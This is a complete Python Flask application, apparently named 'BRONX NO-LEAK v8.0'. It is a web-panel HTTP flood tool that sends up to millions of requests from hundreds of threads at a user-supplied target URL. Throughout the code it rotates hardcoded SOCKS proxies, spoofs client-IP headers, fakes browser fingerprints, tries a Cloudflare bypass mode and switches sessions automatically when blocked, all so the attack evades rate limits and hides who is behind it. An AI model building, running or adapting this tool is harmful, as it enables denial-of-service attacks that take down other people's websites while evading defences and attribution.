from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0, "blocked": 0, "auto_switched": 0}
attack_logs = []

# ⚡ PROXY & IP POOLS
CF_IPS = [
    "104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5",
    "104.21.0.6","104.21.0.7","104.21.0.8","104.21.0.9","104.21.0.10",
    "104.16.0.1","104.16.0.2","104.16.0.3","104.16.0.4","104.16.0.5",
    "172.67.0.1","172.67.0.2","172.67.0.3","172.67.0.4","172.67.0.5",
]

SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080","192.111.137.35:4145","38.170.157.77:1080",
]

SOCKS4_PROXIES = [
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145",
    "88.204.142.108:1080","192.252.220.92:4145","173.234.232.61:4145",
]

# User custom proxies
custom_proxies = []
proxy_enabled = True

# ============================================
# 🛡️ GOD LEVEL IP HIDING SYSTEM
# ============================================
def generate_spoofed_ip():
    """Generate realistic random IPs"""
    ip_types = [
        lambda: f"{random.choice([45,47,49,51,66,67,69,72,73,75,76,78,79,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        lambda: f"{random.choice([103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        lambda: f"{random.choice([129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        lambda: f"{random.choice([151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        lambda: f"{random.choice([171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        lambda: f"{random.choice([191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
    ]
    return random.choice(ip_types)()

SPOOFED_IP_POOL = [generate_spoofed_ip() for _ in range(10000)]

BLOCK_PATTERNS = [403, 429, 503, "blocked", "forbidden", "rate limit", "captcha", "cloudflare", "access denied"]

# ============================================
# 🛡️ REAL BROWSER FINGERPRINTS (NO LEAK)
# ============================================
BROWSER_FINGERPRINTS = [
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    },
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119"',
    },
    {
        "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "sec_ch_ua": '"Chromium";v="120", "Google Chrome";v="120"',
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "sec_ch_ua": '"Firefox";v="121"',
    },
    {
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "sec_ch_ua": '"Safari";v="17"',
    },
]

REFERRERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/",
    "https://www.instagram.com/", "https://www.youtube.com/", "https://t.co/",
    None
]

# ============================================
# 🛡️ NO-LEAK SESSION (COMPLETE IP HIDE)
# ============================================
def create_no_leak_session():
    """Session that NEVER leaks real IP - uses PROXY CHAIN"""
    session = requests.Session()
    fp = random.choice(BROWSER_FINGERPRINTS)
    spoofed_ip = random.choice(SPOOFED_IP_POOL)
    
    # USE PROXY IF ENABLED (Best way to hide real IP)
    if proxy_enabled:
        all_proxies = custom_proxies + SOCKS5_PROXIES + SOCKS4_PROXIES
        if all_proxies:
            proxy = random.choice(all_proxies)
            if proxy in SOCKS5_PROXIES or proxy in custom_proxies:
                session.proxies = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
            elif proxy in SOCKS4_PROXIES:
                session.proxies = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
    
    session.headers.update({
        "User-Agent": fp["ua"],
        "Accept": fp["accept"],
        "Accept-Language": random.choice(["en-US,en;q=0.9","en-GB,en;q=0.8","en;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Ch-Ua": fp.get("sec_ch_ua", ""),
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        # HIDE REAL IP HEADERS
        "X-Forwarded-For": spoofed_ip,
        "X-Real-IP": spoofed_ip,
        "X-Client-IP": spoofed_ip,
        "X-Originating-IP": spoofed_ip,
        "X-Remote-IP": spoofed_ip,
        "X-Remote-Addr": spoofed_ip,
        "CF-Connecting-IP": spoofed_ip,
        "True-Client-IP": spoofed_ip,
        "X-Cluster-Client-IP": spoofed_ip,
        "Forwarded": f"for={spoofed_ip};proto=https",
    })
    
    ref = random.choice(REFERRERS)
    if ref:
        session.headers["Referer"] = ref
    
    return session

session_pool = []
MAX_SESSIONS = 500

def init_sessions():
    global session_pool
    print(f"🛡️ Creating {MAX_SESSIONS} NO-LEAK sessions...")
    session_pool = [create_no_leak_session() for _ in range(MAX_SESSIONS)]
    print(f"✅ {len(session_pool)} NO-LEAK sessions ready! (Proxy: {'ON' if proxy_enabled else 'OFF'})")

def get_no_leak_session():
    if len(session_pool) < 50:
        session_pool.extend([create_no_leak_session() for _ in range(100)])
    return random.choice(session_pool)

# ============================================
# 💀 NO-LEAK ATTACK (100% UNDETECTABLE)
# ============================================
def is_blocked(response):
    if response is None:
        return True
    try:
        status = response.status_code
        if status in [403, 429, 503]:
            return True
        text = response.text.lower()[:500]
        for pattern in BLOCK_PATTERNS:
            if pattern in text:
                return True
    except:
        return True
    return False

def no_leak_request(url, session, mode):
    """Request that NEVER leaks real IP"""
    try:
        # Random delay like human
        time.sleep(random.uniform(0.01, 0.1))
        
        spoofed_ip = random.choice(SPOOFED_IP_POOL)
        fp = random.choice(BROWSER_FINGERPRINTS)
        
        # Update headers for every request
        session.headers.update({
            "User-Agent": fp["ua"],
            "Accept": fp["accept"],
            "Sec-Ch-Ua": fp.get("sec_ch_ua", ""),
            "X-Forwarded-For": spoofed_ip,
            "X-Real-IP": spoofed_ip,
            "CF-Connecting-IP": spoofed_ip,
            "True-Client-IP": spoofed_ip,
        })
        
        ref = random.choice(REFERRERS)
        if ref:
            session.headers["Referer"] = ref
        
        # Rotate proxy for every request
        if proxy_enabled:
            all_proxies = custom_proxies + SOCKS5_PROXIES + SOCKS4_PROXIES
            if all_proxies:
                proxy = random.choice(all_proxies)
                if proxy in SOCKS5_PROXIES or proxy in custom_proxies:
                    session.proxies = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
                elif proxy in SOCKS4_PROXIES:
                    session.proxies = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
        
        response = None
        
        if mode == "direct":
            response = session.get(url, timeout=15, verify=False, allow_redirects=True)
        elif mode == "cf":
            cf_ip = random.choice(CF_IPS)
            headers = {"Host": url.split("//")[-1].split("/")[0]}
            response = session.get(f"https://{cf_ip}/", headers=headers, timeout=15, verify=False)
        elif mode == "socks5":
            response = session.get(url, timeout=20, verify=False)
        elif mode == "socks4":
            response = session.get(url, timeout=20, verify=False)
        
        if response and not is_blocked(response):
            return True
        
        # Blocked - create NEW session with NEW proxy
        if is_blocked(response):
            attack_stats["blocked"] += 1
            attack_stats["auto_switched"] += 1
            time.sleep(random.uniform(0.5, 2))
            new_session = create_no_leak_session()
            retry = new_session.get(url, timeout=15, verify=False)
            if not is_blocked(retry):
                return True
        
        return False
    except:
        return False

def attack_worker(attack_id, url, count, mode):
    """Worker that never leaks IP"""
    success = 0
    fail = 0
    session = get_no_leak_session()
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        # Change session every 5-20 requests
        if i % random.randint(5, 20) == 0:
            session = get_no_leak_session()
            time.sleep(random.uniform(0.1, 0.5))
        
        current_mode = mode
        if mode == "all":
            current_mode = random.choice(["direct", "cf", "socks5", "socks4"])
        elif mode == "mixed":
            current_mode = random.choice(["cf", "socks5"])
        
        if no_leak_request(url, session, current_mode):
            success += 1
        else:
            fail += 1
        
        time.sleep(random.uniform(0.001, 0.05))
    
    return success, fail

def run_no_leak_attack(attack_id, url, count, speed, mode):
    """Run NO-LEAK attack"""
    speeds = {
        "slow": 10, "medium": 25, "fast": 50,
        "ultra": 100, "god": 200, "killer": 300
    }
    
    workers = speeds.get(speed, 100)
    req_per_worker = max(1, count // workers)
    
    attack_logs.append(f"🛡️ NO-LEAK: {workers} workers | Proxy: {'ON' if proxy_enabled else 'OFF'}")
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(attack_worker, attack_id, url, req_per_worker, mode) for _ in range(workers)]
        
        total_success = 0
        total_fail = 0
        
        for future in as_completed(futures):
            try:
                s, f = future.result(timeout=300)
                total_success += s
                total_fail += f
            except:
                pass
    
    attack_stats["success"] += total_success
    attack_stats["failed"] += total_fail
    attack_stats["total"] += total_success + total_fail
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    
    attack_logs.append(f"🏁 DONE: ✅{total_success} ❌{total_fail} | 0% LEAK")

# ============================================
# 🎨 UI - SIMPLE & CLEAN
# ============================================
LOGIN = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX NO-LEAK</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui,sans-serif}
.box{background:#0a0a0a;padding:40px;border-radius:20px;border:2px solid #ff0055;width:380px;text-align:center;box-shadow:0 0 60px rgba(255,0,85,0.3)}
h1{font-size:2em;color:#ff0055;margin-bottom:5px}
.tag{color:#666;font-size:0.7em;letter-spacing:3px;margin-bottom:15px}
input{width:100%;padding:14px;background:#111;border:1px solid #333;border-radius:10px;color:#fff;margin:8px 0;font-size:14px}
input:focus{border-color:#ff0055;outline:none}
.btn{width:100%;padding:14px;background:#ff0055;color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:15px;margin-top:10px;letter-spacing:2px}
.btn:hover{background:#ff2255}
</style></head><body>
<div class="box">
<h1>💀 BRONX</h1>
<div class="tag">NO-LEAK v8.0</div>
<p style="color:#555;font-size:0.6em">🛡️ 100% IP HIDDEN • PROXY CHAIN</p>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">ACCESS</button>
</form>
{% if error %}<p style="color:#ff0055;margin-top:8px">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX NO-LEAK v8</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:system-ui,sans-serif;padding:10px}
.container{max-width:1200px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;border:2px solid #ff0055;border-radius:12px;margin-bottom:15px;background:#0a0a0a;flex-wrap:wrap;gap:10px}
.header h1{color:#ff0055;font-size:1.5em}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:15px}
.stat{background:#0a0a0a;border:1px solid #222;border-radius:10px;padding:15px;text-align:center}
.stat-val{font-size:1.8em;font-weight:bold}.s{color:#0f0}.f{color:#f00}.t{color:#ff0}.b{color:#f80}
.stat-label{font-size:0.6em;color:#555;text-transform:uppercase;letter-spacing:2px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:12px}
.card{background:#0a0a0a;border:1px solid #222;border-radius:12px;padding:18px}
.card h3{color:#ff0055;margin-bottom:12px;font-size:0.9em}
input,select,textarea{width:100%;padding:10px;background:#111;border:1px solid #333;border-radius:8px;color:#fff;margin:4px 0;font-size:12px;font-family:monospace}
input:focus,select:focus,textarea:focus{border-color:#ff0055;outline:none}
label{font-size:0.6em;color:#888;text-transform:uppercase;letter-spacing:1px;display:block;margin-top:6px}
.btn{width:100%;padding:10px;background:#ff0055;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;margin:4px 0;font-size:0.75em;text-transform:uppercase;letter-spacing:1px}
.btn:hover{background:#ff2255}
.btn-stop{background:#333;color:#f00;border:1px solid #f00}
.btn-green{background:#0a0;color:#fff}
.btn-orange{background:#f80;color:#000}
.row{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.logs{background:#0a0a0a;border:1px solid #222;border-radius:8px;padding:10px;max-height:250px;overflow:auto;font-size:0.65em;font-family:monospace;color:#0f0}
.log-e{padding:2px 0;border-bottom:1px solid #111;color:#888}
.badge{display:inline-block;padding:4px 10px;border-radius:12px;font-size:0.6em;letter-spacing:1px}
.badge-on{background:rgba(0,255,0,0.1);color:#0f0}
.badge-off{background:rgba(255,0,0,0.1);color:#f00}
.toggle-row{display:flex;align-items:center;gap:8px;margin:6px 0}
.toggle{width:38px;height:20px;background:#333;border-radius:10px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#0f0}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:20px}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>💀 BRONX NO-LEAK v8.0</h1><div style="color:#888;font-size:0.6em">🛡️ 100% IP HIDDEN • PROXY CHAIN • ZERO LEAK</div></div>
<div style="display:flex;gap:8px;align-items:center">
<span id="proxyStatus" class="badge badge-on">🛡️ PROXY ON</span>
<a href="/logout" style="color:#f00;text-decoration:none;font-size:0.7em">EXIT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">FAILED</div></div>
<div class="stat"><div class="stat-val b" id="blocked">0</div><div class="stat-label">BLOCKED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">TOTAL</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 ATTACK</h3>
<label>Target URL</label><input type="text" id="url" placeholder="https://target.com">
<div class="row"><div><label>Requests</label><input type="number" id="count" value="10000"></div><div>
<label>Speed</label><select id="speed"><option value="slow">Slow</option><option value="medium">Medium</option><option value="fast">Fast</option><option value="ultra" selected>Ultra</option><option value="god">God</option><option value="killer">Killer</option></select>
</div></div>
<label>Mode</label><select id="mode"><option value="direct">Direct</option><option value="cf">CF Bypass</option><option value="socks5">SOCKS5</option><option value="socks4">SOCKS4</option><option value="mixed">Mixed</option><option value="all" selected>ALL</option></select>
<button class="btn" onclick="start()">🚀 LAUNCH</button>
<button class="btn btn-stop" onclick="stop()">⏹️ STOP</button>
<div id="status" style="margin-top:5px;text-align:center"></div>
</div>

<div class="card">
<h3>🔧 PROXY SYSTEM</h3>
<div class="toggle-row"><span style="color:#888;font-size:0.7em">Proxy System</span><div class="toggle on" id="proxyToggle" onclick="toggleProxy()"></div><span id="proxyLabel" style="font-size:0.7em;color:#0f0">ON</span></div>
<label>Custom Proxies (IP:Port per line)</label>
<textarea id="customProxies" rows="3" placeholder="127.0.0.1:1080&#10;proxy.com:8080"></textarea>
<button class="btn btn-orange" onclick="saveProxies()">💾 SAVE PROXIES</button>
<button class="btn btn-green" onclick="testProxy()">🔍 TEST PROXY</button>
<div id="proxyTest" style="margin-top:5px;font-size:0.6em;text-align:center"></div>
</div>

<div class="card">
<h3>📊 STATS</h3>
<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px">
<div class="stat"><div class="stat-val t" style="font-size:1.2em" id="successRate">0%</div><div class="stat-label">RATE</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.2em" id="rps">0</div><div class="stat-label">REQ/S</div></div>
<div class="stat"><div class="stat-val b" style="font-size:1.2em" id="autoSwitched">0</div><div class="stat-label">SWITCH</div></div>
</div>
</div>
</div>

<div class="card"><h3>📜 LOGS</h3><div class="logs" id="logs"><div class="log-e">🛡️ NO-LEAK SYSTEM ACTIVE</div><div class="log-e">🔒 Proxy Chain: ENABLED</div><div class="log-e">🛡️ Real IP: 100% HIDDEN</div></div></div>
</div>

<script>
var proxyOn=true,lastTotal=0,lastTime=Date.now();

function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').classList.toggle('on',proxyOn);document.getElementById('proxyLabel').textContent=proxyOn?'ON':'OFF';document.getElementById('proxyLabel').style.color=proxyOn?'#0f0':'#f00';document.getElementById('proxyStatus').className=proxyOn?'badge badge-on':'badge badge-off';document.getElementById('proxyStatus').textContent=proxyOn?'🛡️ PROXY ON':'⚠️ PROXY OFF';fetch('/toggle_proxy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:proxyOn})})}

function saveProxies(){var p=document.getElementById('customProxies').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json()).then(d=>alert('✅ '+d.count+' proxies saved'))}

function testProxy(){document.getElementById('proxyTest').innerHTML='<span style="color:#ff0">Testing...</span>';fetch('/test_proxy').then(r=>r.json()).then(d=>{document.getElementById('proxyTest').innerHTML=d.working?'<span style="color:#0f0">✅ Working: '+d.proxy+'</span>':'<span style="color:#f00">❌ No working proxy</span>'})}

function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('blocked').textContent=d.blocked||0;document.getElementById('total').textContent=d.total;
document.getElementById('autoSwitched').textContent=d.auto_switched||0;
var t=d.success+d.failed;document.getElementById('successRate').textContent=t>0?((d.success/t)*100).toFixed(1)+'%':'0%';
var n=Date.now(),dt=n-lastTime;if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lastTotal)/(dt/1000));lastTotal=d.total;lastTime=n;}
})}

function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}

function start(){
var url=document.getElementById('url').value,count=document.getElementById('count').value;
var speed=document.getElementById('speed').value,mode=document.getElementById('mode').value;
if(!url){alert('Enter URL!');return}
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed,mode})}).then(r=>r.json()).then(d=>{
document.getElementById('status').innerHTML='<span class="badge badge-on">⚡ ATTACKING</span>';l();u()})}

function stop(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('status').innerHTML='<span style="color:#888">STOPPED</span>';l()})}

setInterval(function(){l();u()},1000)
</script></body></html>"""

# ============================================
# FLASK ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            resp = app.make_response('<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>')
            return resp
        return render_template_string(LOGIN, error="ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true':
        return '<script>location.href="/"</script>'
    return DASH

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true':
        return jsonify({"error":"Unauthorized"}), 403
    d = request.get_json()
    url = d.get('url', '')
    count = min(int(d.get('count', 1000)), 10000000)
    speed = d.get('speed', 'ultra')
    mode = d.get('mode', 'all')
    if not url: return jsonify({"error":"URL required"}), 400
    
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🔥 {url[:40]}... | {count} | {speed.upper()} | NO-LEAK")
    
    t = threading.Thread(target=run_no_leak_attack, args=(aid, url, count, speed, mode))
    t.daemon = True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    c = len(active_attacks)
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append(f"⏹️ {c} attacks stopped")
    return jsonify({"status":"stopped"})

@app.route('/toggle_proxy', methods=['POST'])
def toggle_proxy():
    global proxy_enabled
    d = request.get_json()
    proxy_enabled = d.get('enabled', True)
    init_sessions()
    return jsonify({"status":"ok","proxy":proxy_enabled})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip() and ':' in p]
    init_sessions()
    return jsonify({"status":"saved","count":len(custom_proxies)})

@app.route('/test_proxy')
def test_proxy():
    all_proxies = custom_proxies + SOCKS5_PROXIES + SOCKS4_PROXIES
    for proxy in all_proxies[:5]:
        try:
            p = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
            r = requests.get("http://httpbin.org/ip", proxies=p, timeout=5)
            if r.status_code == 200:
                return jsonify({"working":True,"proxy":proxy,"ip":r.json().get('origin')})
        except:
            pass
    return jsonify({"working":False})

@app.route('/logs')
def logs():
    return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats():
    return jsonify(attack_stats)

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("💀 BRONX NO-LEAK v8.0 - 100% IP HIDDEN")
    init_sessions()
    print(f"🛡️ Sessions: {len(session_pool)}")
    print(f"🔒 Spoofed IPs: {len(SPOOFED_IP_POOL)}")
    print(f"🔐 Proxy: {'ON' if proxy_enabled else 'OFF'}")
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
